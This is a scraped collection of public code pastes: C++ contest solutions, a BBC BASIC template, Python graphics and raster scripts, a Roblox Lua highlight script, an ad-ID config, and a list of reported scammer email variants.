          .attr(""cx"", xScale(2004))
          .attr(""cy"", yScale(parseTime(""37:36"")))
          .attr(""r"", 10)
          .attr(""stroke"", ""red"")
          .attr(""fill"", ""none"")
          .attr(""class"", ""annotation"");

        svg
          .append(""text"")
          .attr(""x"", xScale(2004) + 15)
          .attr(""y"", yScale(parseTime(""37:36"")) + 15)
          .text(""Fastest time with doping allegations"")
          .attr(""class"", ""annotation"");
      });
    </script>
  </body>
</html>
```
"
JU5TreEd,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 10:58:13 AM CDT,"#include <bits/stdc++.h>
 
using namespace std;
const int maxn = 1e5 + 10;
const int INF = (1 << 30);
typedef long long ll;
const ll inf = (1LL << 59LL);
struct node{
    int till, euro, time;
    node (){}
    node(int _t, int _timee, int _e){
        till = _t;
        time = _timee;
        euro = _e;
    }
};
vector<node> graph[5005];
int n, m, S;
bool visited[3005][6005];
int idx[3005];
int main()
{
    ios_base::sync_with_stdio(false);
    cin >> S >> n >> m;
    for(int i = 0; i < m; i++){
        int a, b, c, d;
        cin >> a >> b >> c >> d;
        a--; b--;
        graph[a].push_back(node(b, c, d));
        graph[b].push_back(node(a, c, d));
    }
    memset(visited, false, sizeof visited);
   int  min_vreme = INF;
    queue<int> q;
    q.push(0);
    q.push(0);
    q.push(0);
    int sosed;
    int weight, money;
    int eee;
    while(!q.empty()){
        int teme = q.front();
        q.pop();
        int pari = q.front();
        q.pop();
        int pat = q.front();
        q.pop();
        if(teme == n - 1){
            if(pat <= S){
                min_vreme = min(min_vreme, pari);
            }
            continue;
        }
        for(int i = 0; i < (int)graph[teme].size(); i++){
            sosed = graph[teme][i].till;
            money = graph[teme][i].time;
            weight = graph[teme][i].euro;
            if(weight + pat <= S){
                    eee = money + pari;
            if(eee >= 6000) eee -= 6000;
                if(!visited[sosed][eee]){
                    visited[sosed][eee] = true;
                    q.push(sosed);
                    q.push(pari + money);
                    q.push(pat + weight);
                }
            }
        }
 
    }
 
    q.push(0);
    q.push(0);
    q.push(0);
    memset(visited, false, sizeof visited);
    while(!q.empty()){
        int teme = q.front();
        q.pop();
        int pari = q.front();
        q.pop();
        int pat = q.front();
        q.pop();
        if(teme == n - 1){
            if(pat <= S){
                min_vreme = min(min_vreme, pari);
            }
            continue;
        }
        for(int i = 0; i < (int)graph[teme].size(); i++){
            sosed = graph[teme][i].till;
            money = graph[teme][i].time;
            weight = graph[teme][i].euro;
            if(weight + pat <= S){
                    eee = pat + weight;
                if(eee >= 6000){
                    eee -= 6000;
                }
                if(!visited[sosed][pat + weight]){
                    visited[sosed][pat + weight] = true;
                    q.push(sosed);
                    q.push(pari + money);
                    q.push(pat + weight);
                }
            }
        }
 
    }
        q.push(0);
    q.push(0);
    q.push(0);
    memset(idx, 0, sizeof idx);
    memset(visited, false, sizeof visited);
    while(!q.empty()){
        int teme = q.front();
        q.pop();
        int pari = q.front();
        q.pop();
        int pat = q.front();
        q.pop();
        if(teme == n - 1){
            if(pat <= S){
                min_vreme = min(min_vreme, pari);
            }
            continue;
        }
        for(int i = 0; i < (int)graph[teme].size(); i++){
            sosed = graph[teme][i].till;
            money = graph[teme][i].time;
            weight = graph[teme][i].euro;
            if(weight + pat <= S){
                    eee = idx[sosed] + 1;
                    if(eee >= 6000){
                        eee -= 6000;
                    }
                    idx[sosed]++;
                if(!visited[sosed][pat + weight]){
                    visited[sosed][pat + weight] = true;
                    q.push(sosed);
                    q.push(pari + money);
                    q.push(pat + weight);
                }
            }
        }
 
    }
 
 
 
    if(min_vreme == INF){
        cout << -1 << endl;
        return 0;
    }
    cout << min_vreme << endl;
    return 0;
}"
HsEUYSwP,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 10:56:18 AM CDT,"#include <iostream>
#include <queue>
#include <fstream>
#include <vector>
#include <cstring>
//#include <bits/stdc++.h>
using namespace std;
const int maxn = 3005;
const int INF = 1e8;
const int di[] = {-1, 1, 0, 0};
const int dj[] = {0, 0, -1, 1};
struct node {
    int b, T, E;
    node () {}
    node(int _b, int _T, int _E) {
        b = _b;
        T = _T;
        E = _E;
    }
    
};
vector<node> graph[maxn];
int n, m;
int dp[maxn][2002];
int rec(int at, int money_left) {
    if(at == n) {
        return 0;
    }
    if(money_left == 0) {
        return INF;
    }
    if(dp[at][money_left] != -1) {
        return dp[at][money_left];
    }
    int res = INF;
    for(int i = 0; i < (int) graph[at].size(); i++) {
        int neighbour = graph[at][i].b;
        int time = graph[at][i].T;
        int money = graph[at][i].E;
        
        if(money_left >= money) {
            res = min(res, rec(neighbour, money_left - money) + time);
        }
    }
    return dp[at][money_left] = res;
}
int main() {
    ios_base::sync_with_stdio(false);
//    ifstream cin(""in.txt"");
    int S;
    cin >> S >> n >> m;
    
    for(int i = 0; i < m; i++) {
        int a, b, c, d;
        cin >> a >> b >> c >> d;
        graph[a].push_back(node(b, c, d));
        graph[b].push_back(node(a, c, d));
    }
    memset(dp, -1, sizeof dp);
    int res = INF;
    for(int i = 1; i <= S; i++) {
        res = min(res, rec(1, i));
    }
    if(res >= INF) {
        res = -1;
    }
    cout << res << endl;
    
    return 0;
}
"
ubrqY1Eq,grid,tifaout,JSON,Tuesday 13th of February 2024 10:51:08 AM CDT,"{
	""ADS"": {
	
		""native_type"": ""applovin"",
		""inter_type"": ""applovin"",
		""banner_type"": ""applovin"",
        ""reward_type"": ""applovin"",
	

	 
		""banner_applovin"": ""60f8d7ed0ba6548d"",
		""native_applovin"": ""6397781f6e4ecaf9"",
		""interstitial_applovin"": ""1db592af0ce9f8bd"",
        ""reward_applovin"": ""de53b7059fc8b4e9"",
        ""open_applovin"": ""c26c8f8ff266b73d"",


		 
		
		""facebook_interstitial"": ""173468672252119_174051032193883"",
		""facebook_native"": ""173468672252119_174051175527202"",
		""facebook_banner"": ""173468672252119_173477828917870"",
		""facebook_reward"": ""2028286464230349_2033281763730819"",
		
		""pushUpdate"": ""off"",
        ""newPackage"": """"

		 
	}  
   }"
Wt3cSBCW,BBCBASIC_TEMPLATE,lovejoy777,ZXBasic,Tuesday 13th of February 2024 10:49:07 AM CDT,"   10 REM ******************************
   20 REM *        AGON LIGHT 2        *
   30 REM *     BBC BASIC TEMPLATE     *
   40 REM *      BBC BASIC MODE 8      *
   50 REM *    C/W RESET ORIG SCREEN   *
   60 REM *      BY STEVE LOVEJOY      *
   70 REM ******************************
   80 :
   90 REM MAIN SETUP.
  100 CLEAR : REM clear memory.
  110 :
  120 PROC_LOAD_VARS            : REM CALL LOAD_VARS.
  130 PROC_GET_ORIGINALS        : REM CALL GET_ORIGINALS.
  130 PROC_INITIALIZE_SCREEN    : REM CALL INIT_SCREEN.
  140 PROC_MAIN_LOOP            : REM CALL MAIN_LOOP.
  150 :
 1000 DEF PROC_MAIN_LOOP        : REM ** MAIN LOOP **
 1010 COLOUR COL_YELLOW%        : REM change text colour.
 1020 PRINT TAB(15,10)""HELLO WORLD!"" : REM print at (x,y).
 1030 A%=INKEY(0)               : REM GET keyboard input.
 1040 IF A%=120 OR A%=88 THEN PROC_CHECK_EXIT : REM press X to exit.
 1050 GOTO 1000                 : REM loop back to start of MAIN_LOOP.
 3000 ENDPROC : REM END PROC_MAINLOOP.
 3010 :
 4000 DEF PROC_GET_ORIGINALS    : REM ** GET_ORIGINALS **
 4010 OM% = FN_GETBYTE_VDP(&27) : REM GET original Screen Mode.
 4020 VDU 23,230,255,255,255,255,255,255,255,255 : REM create new filled char with original colours.
 4030 PRINT TAB(0,0);CHR$(230)  : REM print new char top left.
 4040 OTFC% = POINT(1,1)        : REM get original text fg colour.
 4050 VDU 127                   : REM backspace/delete to get to clear.
 4060 OTBC% = POINT(1,1) + 128  : REM get original text bg colour.
 4070 ENDPROC : REM END PROC_GET_ORIGINALS
 4080 :
 5500 DEF PROC_INITIALIZE_SCREEN : REM ** INITIALIZE_SCREEN **
 5510 MODE 8                     : REM SETS new screen mode.
 5520 CLS                        : REM clear text screen.
 5530 CLG                        : REM clear graphics screen.
 5540 PROC_HIDE_CURSOR
 5550 ENDPROC : REM END PROC_INITIALIZE_SCREEN.
 5570 :
 6000 DEF PROC_HIDE_CURSOR       : REM ** HIDE_CURSOR **
 6010 VDU 23,1,0;0;0;0;
 6020 ENDPROC
 6030 :
 6040 DEF PROC_SHOW_CURSOR       : REM ** SHOW_CURSOR **
 6050 VDU 23,1,1;0;0;0;
 6060 ENDPROC
 6070 :
 8000 DEF PROC_LOAD_VARS : REM ** LOAD_VARS **
 8010 REM NAME COLOURS +128 for background.
 8020 COL_BLACK% = 0
 8030 COL_RED% = 1
 8040 COL_GREEN% = 2
 8050 COL_YELLOW% = 3
 8060 COL_BLUE% = 4
 8070 COL_MAGENTA% = 5
 8080 COL_CYAN% = 6
 8090 COL_WHITE% = 7
 8100 COL_INTRED% = 9
 8110 COL_INTGREEN% = 10
 8120 COL_INTYELLOW% = 11
 8130 COL_INTBLUE% = 12
 8140 COL_INTMAGENTA% = 13
 8150 COL_INTCYAN% = 14
 8160 COL_INTWHITE% = 15
 8500 ENDPROC : REM END LOAD_VARS.
 8510 :
 8600 DEF PROC_CHECK_EXIT : REM ** CHECK EXIT **
 8610 PRINT TAB(7,12);""Quit Press Y to confirm""
 8620 N$=GET$
 8630 IF N$=""y"" OR N$= ""Y"" THEN GOTO 8670
 8640 ENDPROC : REM END PROC_CHECK_EXIT
 8660 :
 8670 PROC_RESET_ORIGINALS : REM CALL reset original.
 8680 P.""GOODBYE!""         : REM print to screen to test restore function.
 8690 END : REM END program.
 8690 :
 9000 DEF PROC_RESET_ORIGINALS : REM ** RESET_ORIGINALS **
 9010 VDU 20           : REM reset logical colours to default colours. 
 9010 MODE OM%         : REM SET original screen mode.
 9020 COLOUR OTFC%     : REM SET original text fg colour.
 9030 COLOUR OTBC%     : REM SET original text bg colour.
 9060 PROC_SHOW_CURSOR : REM rest cursor.
 9070 CLS              : REM clear screen to SET original colours.
 9100 ENDPROC : REM END RESET_ORIGINALS
 9110 :"
2nNNQWmE,Least_Square.py,Abhisek92,Python,Tuesday 13th of February 2024 10:48:04 AM CDT,"import torch
import rasterio as rio
from pathlib import Path
from einops import rearrange
from rich.progress import track

src_dir = Path("""")
dst_img = Path("""")

dtype = torch.float32
device=""cpu""
nodata = torch.nan

img_list = sorted(src_dir.glob(""*.tif""))

db = torch.cat(
    tensors=[
        torch.tensor(
            data=rio.open(img, 'r').read(),
            dtype=dtype,
            device=device
        )
        for img in track(
            sequence=img_list,
            description='♻️'
        )
    ],
    dim=0
)

t, h, w = db.shape

db = rearrange(
    tensor=db,
    pattern=""t h w -> (h w) t 1""
)

dt = repeat(
    tensor=torch.arange(
        start=0,
        end=t,
        step=1,
        dtype=dtype,
        device=device,
        requires_grad=False
    ),
    pattern=""t -> n t 1"",
    n=(h * w)
)

grad_img = rearrange(
    tensor=torch.linalg.lstsq(
        A=dt,
        B=db,
        rcond=None,
        driver=None
    ).solution,
    pattern=""(h w) 1 1 -> 1 h w""
).detach().cpu().numpy()

meta = rio.open(img_list[0], 'r').meta.copy()
meta[""count""] = 1
meta[""driver""] = ""GTiff""
meta[""dtype""] = grad_img.dtype
meta[""predictor""] = 3
meta[""tiled""] = True
meta[""blockxsize""] = 64
meta[""blockysize""] = 64
meta[""compress""] = ""LZW""
meta[""num_threads""] = 4
meta[""sparse_ok""] = True
meta[""nodata""] = nodata

with rio.open(dst_img, 'w', **meta) as dst:
    dst.write(grad_img)"
kag3wUgv,# tk_Rotating_Cube_Illusion.py,here2share,Python,Tuesday 13th of February 2024 10:44:05 AM CDT,"# tk_Rotating_Cube_Illusion.py

ww, hh = 600, 600

from tkinter import *
import math
import random
import copy
from PIL import Image, ImageDraw, ImageTk, ImageChops

random.seed(0)

def update_cube_coordinates():
	for i in range(8):
		x, y, z = rotated_coords[i][:3]
		coordinates[i] = get_coords(x , y, z)

def get_coords(x, y, z):
	rxy = (x**2 + y**2)**(1/2)
	rxz = (x**2 + z**2)**(1/2)
	ryz = (y**2 + z**2)**(1/2)

	if x > 0 and y > 0:
		txy = math.atan(y/x)
	elif x > 0 and y < 0:
		txy = 2*math.pi + math.atan(y/x)
	elif x < 0 and y > 0:
		txy = math.pi + math.atan(y/x)
	elif x < 0 and y < 0:
		txy = math.pi + math.atan(y/x)

	if z > 0 and x > 0:
		txz = math.atan(x/z)
	elif z > 0 and x < 0:
		txz = 2*math.pi + math.atan(x/z)
	elif z < 0 and x > 0:
		txz = math.pi + math.atan(x/z)
	elif z < 0 and x < 0:
		txz = math.pi + math.atan(x/z)

	if y > 0 and z > 0:
		tyz = math.atan(z/y)
	elif y > 0 and z < 0:
		tyz = 2*math.pi + math.atan(z/y)
	elif y < 0 and z > 0:
		tyz = math.pi + math.atan(z/y)
	elif y < 0 and z < 0:
		tyz = math.pi + math.atan(z/y)

	return x, y, z, rxy, rxz, ryz, txy, txz, tyz

def rotate_z(coord, t):
	txy = coord[6] + t if coord[6] + t >= 0 else coord[6] + t + 2*math.pi
	x = math.cos(txy) * coord[3]
	y = math.sin(txy) * coord[3]
	return get_coords(x, y, coord[2])

def rotate_y(coord, t):	
	txz = coord[7] + t if coord[7] + t >= 0 else coord[7] + t + 2*math.pi
	z = math.cos(txz) * coord[4]
	x = math.sin(txz) * coord[4]
	return get_coords(x, coord[1], z)

def rotate_x(coord, t):	
	tyz = coord[8] + t if coord[8] + t >= 0 else coord[8] + t + 2*math.pi
	y = math.cos(tyz) * coord[5]
	z = math.sin(tyz) * coord[5]
	return get_coords(coord[0], y, z)

rotation_speeds = {}
def rotation():
	rotation_speeds[""X""] = random.uniform(0.02, 0.05) * random.choice((1, -1))
	rotation_speeds[""Y""] = random.uniform(0.02, 0.05) * random.choice((1, -1))
	rotation_speeds[""Z""] = random.uniform(0.02, 0.05) * random.choice((1, -1))
rotation()

def alias_line(x1, y1, x2, y2):
	num_squares = int(max(abs(x2 - x1), abs(y2 - y1))) or 1
	for i in range(0, num_squares + 1, sq):
		x = (x1 + i * (x2 - x1) // num_squares) // sq * sq
		y = (y1 + i * (y2 - y1) // num_squares) // sq * sq
		try:
			if img.getpixel((x + 2, y + 2)) != (0, 0, 0):
				pos, color = xy[x, y, 'b']
			else:
				pos, color = xy[x, y]
			draw.rectangle(pos, outline=None, fill=color)
		except:
			0
def plot():
	for i in range(4):
		alias_line(rotated_coords[i][0] * Vz/dd + Vx, rotated_coords[i][2] * Vz/dd + Vy,
				 rotated_coords[(i + 1) % 4][0] * Vz/dd + Vx, rotated_coords[(i + 1) % 4][2] * Vz/dd + Vy)

		alias_line(rotated_coords[i + 4][0] * Vz/dd + Vx, rotated_coords[i + 4][2] * Vz/dd + Vy,
				 rotated_coords[((i + 1) % 4) + 4][0] * Vz/dd + Vx, rotated_coords[((i + 1) % 4) + 4][2] * Vz/dd + Vy)

		alias_line(rotated_coords[i][0] * Vz/dd + Vx, rotated_coords[i][2] * Vz/dd + Vy,
				 rotated_coords[i + 4][0] * Vz/dd + Vx, rotated_coords[i + 4][2] * Vz/dd + Vy)

ww, hh = 640, 640
dd = 600
sz = 100
xSpeed = 5.7
ySpeed = 7.8
zSpeed = 9.9
Vx = ww/2
Vy = hh/2
Vz = 1000
bd = 10
sq = 5

coordinates = [
	get_coords(sz, sz, -sz), get_coords(-sz, sz, -sz), get_coords(-sz, sz, sz), get_coords(sz, sz, sz),
	get_coords(sz, -sz, -sz), get_coords(-sz, -sz, -sz), get_coords(-sz, -sz, sz), get_coords(sz, -sz, sz)
]

win = Tk()
win.title(""# tk_Rotating_Cube_Illusion"")
win.geometry(""%dx%d+%d+%d"" %(ww, hh, 10, 10))

C = Canvas(win, width=ww, height=hh)
C.pack()

img = Image.new(""RGB"", (ww, hh), ""white"")
draw = ImageDraw.Draw(img)

for x in range(-2, 3):
	for y in range(-2, 3):
		C.create_text(x + ww // 2, y + 50, text=""PRESS SPACEBAR"", fill=""white"", font=(""Arial"", 40, ""bold""), anchor=""center"", tag=""hideable_text"")
C.create_text(ww // 2, 50, text=""PRESS SPACEBAR"", fill=""red"", font=(""Arial"", 40, ""bold""), anchor=""center"", tag=""hideable_text"")
def blink_text():
	current_state = ""normal"" if C.itemcget(""hideable_text"", ""state"") == ""hidden"" else ""hidden""
	C.itemconfig(""hideable_text"", state=current_state)
	C.tag_raise(""hideable_text"")

	win.after(1000, blink_text)

xy = {}
for i in range(0, ww, sq):
	for j in range(0, hh, sq):
		pos = [i, j, i + sq - 1, j + sq - 1]
		xy[i, j] = (pos, ""white"")
		xy[i, j, 'b'] = (pos, ""black"")
		draw.rectangle(pos, outline=None, fill=random.choice(('black', 'white')))

sp = 0.01
rotate = {
	""q"": (""X"", sp),
	""w"": (""X"", -sp),
	""e"": (""Y"", sp),
	""a"": (""Y"", -sp),
	""s"": (""Z"", sp),
	""d"": (""Z"", -sp),
}

def key_rotate(axis, t):
	rotation_speeds[axis] = t

for k, (axis, t) in rotate.items():
	win.bind(f""<Key-{k}>"", lambda event, axis=axis, t=t: key_rotate(axis, t))
	
def toggle_pause(event):
	global is_paused
	is_paused = not is_paused

blink_text()
win.bind(""<space>"", toggle_pause)
is_paused = False

while True:
	if not is_paused:
		rotated_coords = []
		for i in range(8):
			rotated_coords.append(rotate_x(coordinates[i], rotation_speeds[""X""]))
			rotated_coords[i] = rotate_y(rotated_coords[i], rotation_speeds[""Y""])
			rotated_coords[i] = rotate_z(rotated_coords[i], rotation_speeds[""Z""])

		plot()
		update_cube_coordinates()
						
		imgtk = ImageTk.PhotoImage(img)
		C.create_image(0, 0, anchor=NW, image=imgtk)
		C.tag_raise(""hideable_text"")

		at_wall = 0
		if Vx < -bd:
			xSpeed = abs(xSpeed)
			at_wall = 1
		elif Vx > ww + bd:
			xSpeed = -abs(xSpeed)
			at_wall = 1
		if Vy < -bd:
			ySpeed = abs(ySpeed)
			at_wall = 1
		elif Vy > hh + bd:
			ySpeed = -abs(ySpeed)
			at_wall = 1
		if Vz < 800:
			zSpeed = abs(zSpeed)
			at_wall = 1
		elif Vz > 1800:
			zSpeed = -abs(zSpeed)
			at_wall = 1
			
		if at_wall:
			rotation()
		
		Vx += xSpeed
		Vy += ySpeed
		Vz += zSpeed
	
	win.update()
"
pgx3Lz01,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 10:34:19 AM CDT,"#include <iostream>
#include <queue>
#include <fstream>
//#include <bits/stdc++.h>
using namespace std;
const int maxn = 1005;
const int INF = 1e9;
const int di[] = {-1, 1, 0, 0};
const int dj[] = {0, 0, -1, 1};
int n, m;
char mat[maxn][maxn];
int dist[maxn][maxn];
void paralel_bfs() {
    queue<int> q;
    vector<vector<bool>> v(n, vector<bool>(m, false));
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            dist[i][j] = -1;
            if(mat[i][j] == 'G') {
                q.push(i);
                q.push(j);
                q.push(0);
                v[i][j] = true;
            }
        }
    }
    while(!q.empty()) {
        int ci = q.front(); q.pop();
        int cj = q.front(); q.pop();
        int cekor = q.front(); q.pop();
        
        if(mat[ci][cj] != 'G') {
            dist[ci][cj] = cekor;
        }
//        cout << ci << "" "" << cj << endl;
        for(int i = 0; i < 4; i++) {
            int ti = ci + di[i];
            int tj = cj + dj[i];
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and dist[ti][tj] == -1 and mat[ti][tj] == '.' and !v[ti][tj]) {
                q.push(ti);
                q.push(tj);
                q.push(cekor + 1);
                v[ti][tj] = true;
            }
        }
    }
    
}
struct node {
    int ci, cj, d;
    node () {}
    node(int _ci, int _cj, int _d) {
        ci = _ci;
        cj = _cj;
        d = _d;
    }
    bool operator < (const node & tmp) const {
        return d < tmp.d;
    }
};
bool visited[maxn][maxn];
void dijkstra(int si, int sj, int ei, int ej) {
   
}
int main() {
    ios_base::sync_with_stdio(false);
//    ifstream cin(""in.txt"");
    cin >> n >> m;
    int si, sj, ei, ej;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cin >> mat[i][j];
            if(mat[i][j] == 'R') {
                si = i;
                sj = j;
            }
            if(mat[i][j] == 'Z') {
                ei = i;
                ej = j;
            }
        }
    }
    mat[ei][ej] = '.';
    mat[si][sj] = '.';
//    cout << ""DA"" << endl;
    paralel_bfs();
//    cout << ""DA"" << endl;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            visited[i][j] = false;
        }
    }
    priority_queue<node> pq;
    pq.push(node(si, sj, dist[si][sj]));
    int min_value = INF;
    while(!pq.empty()) {
        node c = pq.top();
        pq.pop();
        min_value = min(min_value, c.d);
        if(ei == c.ci and ej == c.cj) {
            cout << min_value << endl;
            break;
        }
        
//        cout << c.ci << ""  "" << c.cj << endl;
        for(int i = 0; i < 4; i++) {
            int ti = c.ci + di[i];
            int tj = c.cj + dj[i];
            if(ti >= 0 and ti < n and tj >= 0 and tj < m and !visited[ti][tj] and mat[ti][tj] == '.') {
                pq.push(node(ti, tj, dist[ti][tj]));
                visited[ti][tj] = true;
            }
        }
    }
    return 0;
}
/*
 .R234....
 ..1.3.1..
 ..G121G1.
 ....221..
 G...122..
 ....G12..
 ...**.3..
 ...Z..4..
 
 **/
"
tiMupRvt,roblox revealing entities so I can't be lonely,imtie,Lua,Tuesday 13th of February 2024 10:13:55 AM CDT,"--- Once again my PC shut off at home so I can't test this... oh well at least I can type ideas down.
local Player = game.Players.LocalPlayer
local Char = Player.Character
---Services
local InputService = game:GetService(""UserInputService"")
---Deboucnes
local RevealDB = false
--Highlightstats
local HighlightDuration = 5    
local HighlightColor = Color3.New(0,0,0) -- basic white color    
    
local function RevealAllEntities()
    RevealDB = true
   local Highlights = {}
    for i, NewChar in pairs(game.WorkSpace:GetChildren()) do
    if NewChar:FindFirstChild(""Humanoid"") ~= nil and NewChar.Name ~= Char.Name then
        if NewChar.Humanoid.Health > 0 then  -- if statements to see if they should be detected
           local Highlight = Instance.new(""Highlight"",NewChar)
               Highlight.OutlineColor = HighlightColor
                    table.Insert(HighlightedChars, Highlight)   
               NewChar.Humanoid.Died:Connect(function() 
                    if Highlight.Parent ~= nil then Highlight:Destroy() end
                    end)
                
        end
    end
    
        task.wait(HighlightDuration)
        if #Highlights > 0 then
            for i, Highlight in Pairs(Highlights) do
              if Highlight.Parent ~= nil then Highlight:Destroy() end
                end
            end
        RevealDB = false
    end
    
    -- tbh I'd prefer making it a client event but here's a basic input use for it
    InputService.InputBegan:Connect(function(input, GameProcessed)
    if not GameProcessed then
       if input.Keycode == Enum.Keycode.F and RevealDB == false then
         RevealAllEntities()
       end
    end
end)
    "
zhp8Ez4r,anagram.js leetcode question,c-mcbride,JavaScript,Tuesday 13th of February 2024 10:10:19 AM CDT,"//Leetcode solution for is anagram question. Basically we are checking to see if both elements have the same number of letters in different orders
//Uses obj as hashmap
//Time complexity O(n)

function anagrams(str1, str2) {
  //Check to see if the strings are equal, if not quick return
  if(str1.length !== str2.length){
    return false;
  }

  //split the strings into chars
  let str1Chars = str1.split("""");
  let str2Chars = str2.split("""");
  let str1Obj = {};
  let str2Obj = {};

  //Add each letter to hashtable, if the letter is already there, increment the value
  for(let i = 0; i < str1Chars.length; i++){
    let currentLetter = str1Chars[i];
    if(str1Obj[currentLetter]){
      str1Obj[currentLetter]++;
    }
    else{
      str1Obj[currentLetter] = 1;
    }
  }

  for(let i = 0; i < str2Chars.length; i++){
    let currentLetter = str2Chars[i];
    if(str2Obj[currentLetter]){
      str2Obj[currentLetter]++;
    }
    else{
      str2Obj[currentLetter] = 1;
    }
  }

  //Compare the two hashes
  //First make sure they have the same number of keys
  const str1Keys = Object.keys(str1Obj);
  const str2Keys = Object.keys(str2Obj);

  if(str1Keys.length !== str2Keys.length){
    return false;
  }

  //Next make sure the values of the keys map
  for(let key of str1Keys){
    if(str1Obj[key] !== str2Obj[key]){
      return false;
    }
  }

  return true;
}
"
Y6bfm0Tm,Untitled,dllbridge,C,Tuesday 13th of February 2024 10:08:29 AM CDT,"



#include   <stdio.h>
#include  <locale.h>       

int    add(    int, int    );   
float _add(float a, float b);  

 
////////////////////////////////////////////////////
int main()                                        // 
{
	
    setlocale(LC_ALL, ""rus"");
			 	
			 	
    int n = add(10, 15);			 	
			 	
    printf(""n = %d\n"", n); 	
    
    float f = _add(1.23, 5.27);			 	
			 	
    printf(""f = %.2f\n"", f); 	    
  
}



/////////////////////////////////////////////////////
int add(int a, int b)                              // 
{
	
	a += b;
	
	
return a;	
}



/////////////////////////////////////////////////////
float _add(float a, float b)                         // 
{
	
	a += b;
	
	
return a;	
}


 
/*
#include   <stdio.h>
#include  <locale.h>     

int add(int a);   

 
////////////////////////////////////////////////////
int main()                                        // 
{
	
    setlocale(LC_ALL, ""rus"");
			 	
			 	
    //int n = add(2);			 	
			 	
    printf(""n = %d"", add(32)); 	
  
return 0;
}



/////////////////////////////////////////////////////
int add(int a)                                     // 
{
	
	a = a + 1;
	
	
return a;	
}


 
*/


"
w4CkZajk,mapmanager.py,zerg959,Python,Tuesday 13th of February 2024 09:19:28 AM CDT,"class Hero:
    def __init__(self, pos, land):
        self.land = land
        self.model = loader.loadModel('smiley')
        self.model.setColor(1, 0.5, 0)
        self.model.setScale(0.3)
        self.model.setPos(pos)
        self.model.reparentTo(render)"
AzgzaAQi,Nigerian scammers [13-2-3/2024],bombaires,AIMMS,Tuesday 13th of February 2024 09:07:35 AM CDT,"<a href=""mailto:office26237@gmail.com"">office26237@gmail.com</a>
<a href=""mailto:o.ffic.e.2.6.237@gmail.com"">o.ffic.e.2.6.237@gmail.com</a>
<a href=""mailto:off.ice.2.6.237@gmail.com"">off.ice.2.6.237@gmail.com</a>
<a href=""mailto:o.f.f.ic.e26.2.3.7@gmail.com"">o.f.f.ic.e26.2.3.7@gmail.com</a>
<a href=""mailto:o.ff.i.c.e2.6.2.37@gmail.com"">o.ff.i.c.e2.6.2.37@gmail.com</a>
<a href=""mailto:o.f.f.ice2623.7@gmail.com"">o.f.f.ice2623.7@gmail.com</a>
<a href=""mailto:o.f.f.i.ce2.6.2.3.7@gmail.com"">o.f.f.i.ce2.6.2.3.7@gmail.com</a>
<a href=""mailto:of.fi.ce.2.6.2.3.7@gmail.com"">of.fi.ce.2.6.2.3.7@gmail.com</a>
<a href=""mailto:offi.c.e.2.6.2.37@gmail.com"">offi.c.e.2.6.2.37@gmail.com</a>
<a href=""mailto:of.f.i.c.e26237@gmail.com"">of.f.i.c.e26237@gmail.com</a>
<a href=""mailto:o.f.fi.c.e26.23.7@gmail.com"">o.f.fi.c.e26.23.7@gmail.com</a>
<a href=""mailto:off.ic.e26.23.7@gmail.com"">off.ic.e26.23.7@gmail.com</a>
<a href=""mailto:offi.ce.262.3.7@gmail.com"">offi.ce.262.3.7@gmail.com</a>
<a href=""mailto:o.f.fi.ce.26.2.3.7@gmail.com"">o.f.fi.ce.26.2.3.7@gmail.com</a>
<a href=""mailto:o.ff.i.ce.2.62.3.7@gmail.com"">o.ff.i.ce.2.62.3.7@gmail.com</a>
<a href=""mailto:o.ff.i.ce262.3.7@gmail.com"">o.ff.i.ce262.3.7@gmail.com</a>
<a href=""mailto:of.fi.c.e.2.6.237@gmail.com"">of.fi.c.e.2.6.237@gmail.com</a>
<a href=""mailto:o.ff.i.ce.2.6.2.3.7@gmail.com"">o.ff.i.ce.2.6.2.3.7@gmail.com</a>
<a href=""mailto:of.fi.ce26.2.3.7@gmail.com"">of.fi.ce26.2.3.7@gmail.com</a>
<a href=""mailto:o.f.fi.ce.26.2.37@gmail.com"">o.f.fi.ce.26.2.37@gmail.com</a>
<a href=""mailto:offic.e2.62.3.7@gmail.com"">offic.e2.62.3.7@gmail.com</a>
<a href=""mailto:of.f.i.ce.262.3.7@gmail.com"">of.f.i.ce.262.3.7@gmail.com</a>
<a href=""mailto:offi.ce26237@gmail.com"">offi.ce26237@gmail.com</a>
<a href=""mailto:o.f.fi.c.e.2.6.23.7@gmail.com"">o.f.fi.c.e.2.6.23.7@gmail.com</a>
<a href=""mailto:offi.ce.2623.7@gmail.com"">offi.ce.2623.7@gmail.com</a>
<a href=""mailto:o.ff.i.ce262.37@gmail.com"">o.ff.i.ce262.37@gmail.com</a>
<a href=""mailto:o.f.fice2.6.237@gmail.com"">o.f.fice2.6.237@gmail.com</a>
<a href=""mailto:o.ffi.ce.2.6237@gmail.com"">o.ffi.ce.2.6237@gmail.com</a>
<a href=""mailto:of.fi.c.e2.6.2.3.7@gmail.com"">of.fi.c.e2.6.2.3.7@gmail.com</a>
<a href=""mailto:o.ffi.ce.2.62.3.7@gmail.com"">o.ffi.ce.2.62.3.7@gmail.com</a>
<a href=""mailto:off.i.c.e.26.237@gmail.com"">off.i.c.e.26.237@gmail.com</a>
<a href=""mailto:of.fice262.3.7@gmail.com"">of.fice262.3.7@gmail.com</a>
<a href=""mailto:of.fic.e.262.37@gmail.com"">of.fic.e.262.37@gmail.com</a>
<a href=""mailto:o.f.fi.c.e.2.6.2.37@gmail.com"">o.f.fi.c.e.2.6.2.37@gmail.com</a>
<a href=""mailto:off.i.c.e.2.6.2.3.7@gmail.com"">off.i.c.e.2.6.2.3.7@gmail.com</a>
<a href=""mailto:offic.e2623.7@gmail.com"">offic.e2623.7@gmail.com</a>
<a href=""mailto:o.f.fice2623.7@gmail.com"">o.f.fice2623.7@gmail.com</a>
<a href=""mailto:o.ffi.ce.26.23.7@gmail.com"">o.ffi.ce.26.23.7@gmail.com</a>
<a href=""mailto:o.ff.i.c.e.2.62.37@gmail.com"">o.ff.i.c.e.2.62.37@gmail.com</a>
<a href=""mailto:o.ff.i.c.e.2.623.7@gmail.com"">o.ff.i.c.e.2.623.7@gmail.com</a>
<a href=""mailto:office.2.62.3.7@gmail.com"">office.2.62.3.7@gmail.com</a>
